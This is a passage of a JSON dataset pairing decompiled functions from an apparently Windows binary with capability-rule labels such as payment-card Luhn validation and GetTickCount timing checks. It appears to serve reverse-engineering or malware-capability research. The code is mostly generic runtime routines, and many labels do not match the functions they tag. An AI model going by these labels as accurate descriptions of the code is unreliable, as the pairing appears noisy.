0x10;\n            }\n        }\n        return 0xffffffff;\n    }\n    uVar2 = **arg1;\n    *arg1 = *arg1 + 1;\n    return uVar2;\n}\n",
        "token_count": 917
    },
    "1800b22c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800b22c8(ulong noname_0, ulong *arg2, ulong arg3, ulong *arg4)\n\n{\n    ulong uVar1;\n    \n    fcn.1800b22b0(*arg2);\n    uVar1 = fcn.1800b2308(arg3);\n    fcn.1800b22bc(*arg4);\n    return uVar1;\n}\n",
        "token_count": 90
    },
    "1800c3b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800c3b20(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    uint64_t arg1_00;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        arg1_00 = arg1;\n        if (arg1 == 0) {\n            arg1_00 = 1;\n        }\n        do {\n            arg1 = *0x180129fa0;\n            iVar2 = (**0x1800de1f8)(*0x180129fa0, 0, arg1_00);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.1800cec68();\n        } while ((iVar1 != 0) && (arg1 = arg1_00,  iVar1 = fcn.1800c086c(arg1_00),  iVar1 != 0));\n    }\n    puVar3 = fcn.1800ba53c(arg1);\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 246
    },
    "1800b64e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800b64e8(int64_t arg1, ulong *arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uchar auStack840 [32];\n    uchar auStack808 [784];\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack840;\n    if ((arg3 == 0) || (arg1 == 0)) {\n        puVar2 = fcn.1800ba53c(arg1);\n        *puVar2 = 0x16;\n        fcn.1800b3508();\n        if (arg2[1] != NULL) {\n            *arg2[1] = *arg2;\n        }\n    }\n    else {\n        uVar1 = fcn.1800b6588(arg1, arg2, auStack808);\n        fcn.1800b6fa0(uVar1, auStack808, arg3);\n        if (arg2[1] != NULL) {\n            *arg2[1] = *arg2;\n        }\n    }\n    fcn.18008fb00(uStack24 ^ auStack840);\n    return;\n}\n",
        "token_count": 263
    },
    "1800c10a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800c10ac(void)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t arg1;\n    int64_t iVar3;\n    \n    uVar2 = 0;\n    if (*0x1801297f8 == 0) {\n        fcn.1800cd520();\n        arg1 = fcn.1800cd90c();\n        if (arg1 == 0) {\n            uVar2 = 0xffffffff;\n        }\n        else {\n            iVar3 = fcn.1800c1118(arg1);\n            iVar1 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0xffffffff;\n                iVar3 = *0x1801297f8;\n                iVar1 = *0x180129810;\n            }\n            *0x180129810 = iVar1;\n            *0x1801297f8 = iVar3;\n            fcn.1800c34d4(0);\n        }\n        fcn.1800c34d4(arg1);\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "1800c17a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800c17a0(ulong arg1, ulong arg2)\n\n{\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong var_20h_2;\n    ulong var_28h;\n    ulong var_20h;\n    ulong *var_18h;\n    ulong *var_bp_10h;\n    \n    var_18h = &uStackX8;\n    var_bp_10h = &uStackX16;\n    var_28h._0_4_ = 2;\n    var_20h._0_4_ = 2;\n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    fcn.1800c13ec(&var_20h_2, &var_20h, &var_18h, &var_28h);\n    return;\n}\n",
        "token_count": 196
    },
    "1800c198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.1800c1984(void)\n\n{\n    fcn.1800c42b4();\n    return 1;\n}\n",
        "token_count": 30
    },
    "1800c42d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800c42d8(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x180129c58) && ((*0x180123744 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.1800cefa4(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "1800c430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800c430c(int64_t arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    \n    if ((*arg2 != *0x180129f60) && ((*0x180123744 & *(arg1 + 0x3a8)) == 0)) {\n        iVar1 = fcn.1800cd580(arg1);\n        *arg2 = iVar1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "1800c743": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800c7434(int64_t arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == 0) {\n        puVar1 = fcn.1800ba53c(0);\n        *puVar1 = 0x16;\n        fcn.1800b3508();\n        uVar2 = 0xffffffffffffffff;\n    }\n    else {\n        fcn.1800b22b0(arg1);\n        uVar2 = fcn.1800c6fb8(arg1);\n        fcn.1800b22bc(arg1);\n    }\n    return uVar2;\n}\n",
        "token_count": 144
    },
    "1800c74a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800c74a8(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.1800ba53c(0);\n        *puVar1 = 0x16;\n        fcn.1800b3508();\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x180129e3c;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 123
    },
    "1800c74d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800c74d8(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.1800ba53c(0);\n        *puVar1 = 0x16;\n        fcn.1800b3508();\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x180129e40;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 122
    },
    "1800c750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800c7508(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.1800ba53c(0);\n        *puVar1 = 0x16;\n        fcn.1800b3508();\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x180129e38;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 121
    },
    "1800cf07": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800cf078(int64_t arg1)\n\n{\n    if (arg1 != 0) {\n        if (*(arg1 + 0x18) != *0x180123308) {\n            fcn.1800c34d4(*(arg1 + 0x18));\n        }\n        if (*(arg1 + 0x20) != *0x180123310) {\n            fcn.1800c34d4(*(arg1 + 0x20));\n        }\n        if (*(arg1 + 0x28) != *0x180123318) {\n            fcn.1800c34d4(*(arg1 + 0x28));\n        }\n        if (*(arg1 + 0x30) != *0x180123320) {\n            fcn.1800c34d4(*(arg1 + 0x30));\n        }\n        if (*(arg1 + 0x38) != *0x180123328) {\n            fcn.1800c34d4(*(arg1 + 0x38));\n        }\n        if (*(arg1 + 0x40) != *0x180123330) {\n            fcn.1800c34d4(*(arg1 + 0x40));\n        }\n        if (*(arg1 + 0x48) != *0x180123338) {\n            fcn.1800c34d4(*(arg1 + 0x48));\n        }\n        if (*(arg1 + 0x68) != *0x180123358) {\n            fcn.1800c34d4(*(arg1 + 0x68));\n        }\n        if (*(arg1 + 0x70) != *0x180123360) {\n            fcn.1800c34d4(*(arg1 + 0x70));\n        }\n        if (*(arg1 + 0x78) != *0x180123368) {\n            fcn.1800c34d4(*(arg1 + 0x78));\n        }\n        if (*(arg1 + 0x80) != *0x180123370) {\n            fcn.1800c34d4(*(arg1 + 0x80));\n        }\n        if (*(arg1 + 0x88) != *0x180123378) {\n            fcn.1800c34d4(*(arg1 + 0x88));\n        }\n        if (*(arg1 + 0x90) != *0x180123380) {\n            fcn.1800c34d4(*(arg1 + 0x90));\n        }\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "1800cf6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800cf6b8(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x1801232f0) {\n            fcn.1800c34d4(*arg1);\n        }\n        if (arg1[1] != *0x1801232f8) {\n            fcn.1800c34d4(arg1[1]);\n        }\n        if (arg1[2] != *0x180123300) {\n            fcn.1800c34d4(arg1[2]);\n        }\n        if (arg1[0xb] != *0x180123348) {\n            fcn.1800c34d4(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x180123350) {\n            fcn.1800c34d4(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "1800d57f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800d57f4(uint *arg1)\n\n{\n    uint *puVar1;\n    ulong uVar2;\n    \n    if (arg1 == NULL) {\n        puVar1 = fcn.1800ba53c(0);\n        *puVar1 = 0x16;\n        fcn.1800b3508();\n        uVar2 = 0x16;\n    }\n    else {\n        *arg1 = *0x180129fd4;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 122
    },
    "1800d5f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800d5f60(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    fcn.1800d5f80(param_1, param_2, param_3, 0x1b);\n    return;\n}\n",
        "token_count": 60
    },
    "1800d6c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001800d6a9a)\n// WARNING: Removing unreachable block (ram,0x0001800d6adb)\n// WARNING: Removing unreachable block (ram,0x0001800d6afe)\n\nvoid fcn.1800d6c84(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    uchar auStack104 [48];\n    uint64_t uStack56;\n    \n    uStack56 = *0x180123080 ^ auStack104;\n    uVar1 = fcn.180074c6c(arg2);\n    fcn.180074c50(arg2);\n    (**0x1800de8f0)(arg1, uVar1);\n    fcn.180074cac(arg2);\n    fcn.18008fb00(uStack56 ^ auStack104);\n    return;\n}\n",
        "token_count": 191
    },
    "180074c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180074c58(ulong arg1)\n\n{\n    // WARNING: Could not recover jumptable at 0x000180074c63. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de8f0)();\n    return;\n}\n",
        "token_count": 65
    },
    "18008ff9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18008ff90(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    arg1 = arg2 * arg3 + arg1;\n    while( true ) {\n        if (arg3 == 0) break;\n        arg1 = arg1 - arg2;\n        (**0x1800de8f0)(arg1);\n        arg3 = arg3 + -1;\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "18002514": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.180025140(ulong noname_0, int64_t arg2)\n\n{\n    ulong *arg1;\n    ulong *puVar1;\n    int64_t arg1_00;\n    uchar **arg2_00;\n    uchar *puStack216;\n    uchar *puStack208;\n    ulong uStack200;\n    uchar auStack192 [24];\n    uchar auStack168 [160];\n    \n    uStack200 = 0xfffffffffffffffe;\n    fcn.180025240(arg2);\n    arg1_00 = arg2 + 0x20;\n    fcn.180010d70(arg1_00, L\"Spectrum\", 8);\n    *(arg2 + 0x60) = 0;\n    fcn.1800276c0(arg1_00, auStack168);\n    puStack216 = auStack168;\n    puStack208 = &stack0xfffffffffffffff8;\n    arg2_00 = &puStack216;\n    puVar1 = fcn.18002dba0(auStack192, arg2_00);\n    arg1 = arg2 + 0x68;\n    if (arg1 != puVar1) {\n        fcn.18002df90(arg1, arg2_00);\n        *arg1 = *puVar1;\n        *(arg2 + 0x70) = puVar1[1];\n        *(arg2 + 0x78) = puVar1[2];\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        puVar1[2] = 0;\n    }\n    fcn.18002df90(auStack192, arg2_00);\n    fcn.18008ff90(auStack168, 0xa0, 1, fcn.1800252e0);\n    return arg2;\n}\n",
        "token_count": 402
    },
    "18006daf": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.18006dafc(uint64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    if (*0x1801287b8 == 0) {\n        LOCK();\n        uVar2 = *arg1;\n        *arg1 = *arg1 ^ (uVar2 == 0) * (*arg1 ^ 1);\n        uVar4 = 2;\n        iVar3 = (uVar2 != 0) * *arg1;\n        while (iVar3 != 2) {\n            if (iVar3 == 0) {\n                iVar1 = (**0x1800de8f0)(arg1, arg3, 0);\n                if (iVar1 == 0) {\n                    uVar4 = 0;\n                }\n                uVar2 = *arg1;\n                *arg1 = uVar4;\n                if (uVar2 == 1) {\n                    return iVar1 != 0;\n                }\ncode_r0x0001800754aa:\n                (**0x1800de110)(0xd);\n                return 0;\n            }\n            if (iVar3 != 1) goto code_r0x0001800754aa;\n            (**0x1800de4d0)();\n            LOCK();\n            uVar2 = *arg1;\n            *arg1 = *arg1 ^ (uVar2 == 0) * (*arg1 ^ 1);\n            iVar3 = (uVar2 != 0) * *arg1;\n        }\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = (**0x1800de8f0)();\n    }\n    return uVar2;\n}\n",
        "token_count": 390
    },
    "18008ff1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.18008ff14(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    \n    do {\n        iVar2 = fcn.1800b35a0(arg1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar3 = fcn.1800c086c(arg1);\n    } while (iVar3 != 0);\n    if (arg1 == -1) {\n        fcn.180090898();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.18006df20();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 165
    },
    "180094c3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.180094c38(void)\n\n{\n    uchar auStack32 [8];\n    uint uStack24;\n    ulong uStack16;\n    \n    if (*0x1801291b0 == 0) {\n        if (*0x180129214 != 0) {\n            uStack24 = 0;\n            uStack16 = 0x1800923a0;\n            do {\n                *0x180129214 = 1;\n                fcn.180091334(auStack32);\n            } while (*0x180129214 != 0);\n        }\n        *0x180129214 = 1;\n        if (*0x1801291b0 == 0) {\n            fcn.18009697c();\n        }\n        *0x180129214 = 0;\n    }\n    return *0x1801291b0;\n}\n",
        "token_count": 188
    },
    "1800b1bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b1bc0(void)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint64_t arg1;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    int32_t iVar12;\n    int64_t iStack72;\n    int64_t iStack64;\n    char cStack48;\n    \n    fcn.1800b1864(&iStack72, 0);\n    uVar6 = 0;\n    uVar7 = 0x2c0;\n    piVar1 = *(iStack64 + 0x120);\n    arg1 = uVar6;\n    uVar8 = uVar6;\n    do {\n        uVar9 = 0;\n        iVar12 = uVar8;\n        uVar8 = uVar7;\n        if (iVar12 == 1) {\n            arg1 = fcn.1800c3b20(uVar7);\n            if (arg1 == 0) break;\n            fcn.1800ae290(arg1, 0, uVar7);\n            uVar8 = 0x2c0;\n            uVar6 = uVar7;\n        }\n        iVar11 = arg1 - piVar1;\n        piVar10 = piVar1;\n        do {\n            if (iVar12 == 1) {\n                *(iVar11 + piVar10) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar9 = uVar9 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar9 < 7);\n        uVar7 = 0;\n        piVar10 = piVar1 + 7;\n        do {\n            if (iVar12 == 1) {\n                *(piVar10 + iVar11) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 7);\n        uVar7 = 0;\n        piVar10 = piVar1 + 0xe;\n        do {\n            if (iVar12 == 1) {\n                *(piVar10 + iVar11) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 0xc);\n        uVar7 = 0;\n        piVar10 = piVar1 + 0x1a;\n        do {\n            if (iVar12 == 1) {\n                *(piVar10 + iVar11) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 0xc);\n        uVar7 = 0;\n        piVar10 = piVar1 + 0x26;\n        do {\n            if (iVar12 == 1) {\n                *(piVar10 + iVar11) = arg1 + uVar8;\n                iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4) != '\\0');\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + 1 + iVar4;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 2);\n        if (iVar12 == 1) {\n            *(arg1 + 0x140) = arg1 + uVar8;\n            iVar3 = fcn.1800c1fe8(arg1 + uVar8, uVar6 - uVar8, piVar1[0x28]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        uVar7 = 0;\n        iVar4 = -1;\n        do {\n            iVar4 = iVar4 + 1;\n        } while (*(piVar1[0x28] + iVar4) != '\\0');\n        iVar4 = uVar8 + 1 + iVar4;\n        if (iVar12 == 1) {\n            *(arg1 + 0x148) = arg1 + iVar4;\n            iVar3 = fcn.1800c1fe8(arg1 + iVar4, uVar6 - iVar4, piVar1[0x29]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar5 = -1;\n        do {\n            iVar5 = iVar5 + 1;\n        } while (*(piVar1[0x29] + iVar5) != '\\0');\n        iVar5 = iVar4 + 1 + iVar5;\n        if (iVar12 == 1) {\n            *(arg1 + 0x150) = arg1 + iVar5;\n            iVar3 = fcn.1800c1fe8(arg1 + iVar5, uVar6 - iVar5, piVar1[0x2a]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar4 = -1;\n        do {\n            iVar4 = iVar4 + 1;\n        } while (*(piVar1[0x2a] + iVar4) != '\\0');\n        uVar8 = iVar5 + 1 + iVar4;\n        if (iVar12 == 1) {\n            *(arg1 + 0x158) = *(piVar1 + 0x2b);\n            *(arg1 + 0x15c) = 0;\n        }\n        piVar10 = piVar1 + 0x2c;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            uVar9 = 0;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 7);\n        piVar10 = piVar1 + 0x33;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            uVar7 = 0;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar9 = uVar9 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar9 < 7);\n        piVar10 = piVar1 + 0x3a;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            uVar9 = 0;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 0xc);\n        piVar10 = piVar1 + 0x46;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            uVar7 = 0;\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar9 = uVar9 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar9 < 0xc);\n        piVar10 = piVar1 + 0x52;\n        do {\n            for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n            }\n            if (iVar12 == 1) {\n                iVar4 = arg1 + (uVar8 & 0xfffffffffffffffe);\n                *(piVar10 + iVar11) = iVar4;\n                iVar3 = fcn.1800c07fc(iVar4, uVar6 - uVar8 >> 1, *piVar10);\n                if (iVar3 != 0) goto code_r0x0001800c049b;\n            }\n            iVar4 = -1;\n            do {\n                iVar4 = iVar4 + 1;\n            } while (*(*piVar10 + iVar4 * 2) != 0);\n            uVar7 = uVar7 + 1;\n            uVar8 = uVar8 + iVar4 * 2 + 2;\n            piVar10 = piVar10 + 1;\n        } while (uVar7 < 2);\n        for (; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n        }\n        if (iVar12 == 1) {\n            iVar11 = arg1 + (uVar8 & 0xfffffffffffffffe);\n            *(arg1 + 0x2a0) = iVar11;\n            iVar3 = fcn.1800c07fc(iVar11, uVar6 - uVar8 >> 1, piVar1[0x54]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(piVar1[0x54] + iVar11 * 2) != 0);\n        for (uVar8 = uVar8 + iVar11 * 2 + 2; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n        }\n        if (iVar12 == 1) {\n            iVar11 = arg1 + (uVar8 & 0xfffffffffffffffe);\n            *(arg1 + 0x2a8) = iVar11;\n            iVar3 = fcn.1800c07fc(iVar11, uVar6 - uVar8 >> 1, piVar1[0x55]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(piVar1[0x55] + iVar11 * 2) != 0);\n        for (uVar8 = uVar8 + iVar11 * 2 + 2; (uVar8 & 1) != 0; uVar8 = uVar8 + 1) {\n        }\n        if (iVar12 == 1) {\n            iVar11 = arg1 + (uVar8 & 0xfffffffffffffffe);\n            *(arg1 + 0x2b0) = iVar11;\n            iVar3 = fcn.1800c07fc(iVar11, uVar6 - uVar8 >> 1, piVar1[0x56]);\n            if (iVar3 != 0) goto code_r0x0001800c049b;\n        }\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(piVar1[0x56] + iVar11 * 2) != 0);\n        for (uVar7 = uVar8 + iVar11 * 2 + 2; (uVar7 & 1) != 0; uVar7 = uVar7 + 1) {\n        }\n        if (iVar12 == 1) {\n            iVar11 = arg1 + (uVar7 & 0xfffffffffffffffe);\n            *(arg1 + 0x2b8) = iVar11;\n            iVar3 = fcn.1800c07fc(iVar11, uVar6 - uVar7 >> 1, piVar1[0x57]);\n            if (iVar3 != 0) {\ncode_r0x0001800c049b:\n                fcn.1800b3558(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                uVar6 = (*pcVar2)();\n                return uVar6;\n            }\n        }\n        iVar11 = -1;\n        do {\n            iVar11 = iVar11 + 1;\n        } while (*(piVar1[0x57] + iVar11 * 2) != 0);\n        uVar8 = iVar12 + 1U;\n        uVar7 = uVar7 + iVar11 * 2 + 2;\n        uVar9 = arg1;\n    } while (iVar12 + 1U < 2);\n    if (cStack48 != '\\0') {\n        *(iStack72 + 0x3a8) = *(iStack72 + 0x3a8) & 0xfffffffd;\n    }\n    return uVar9;\n}\n",
        "token_count": 3866
    },
    "1800b35a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint64_t fcn.1800b35a0(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    uint64_t arg1_00;\n    \n    if (arg1 < 0xffffffffffffffe1) {\n        arg1_00 = arg1;\n        if (arg1 == 0) {\n            arg1_00 = 1;\n        }\n        do {\n            arg1 = *0x180129fa0;\n            iVar2 = (**0x1800de1f8)(*0x180129fa0, 0, arg1_00);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = fcn.1800cec68();\n        } while ((iVar1 != 0) && (arg1 = arg1_00,  iVar1 = fcn.1800c086c(arg1_00),  iVar1 != 0));\n    }\n    puVar3 = fcn.1800ba53c(arg1);\n    *puVar3 = 0xc;\n    return 0;\n}\n",
        "token_count": 246
    },
    "1800d574": {
        "rules": [
            "contain loop"
        ],
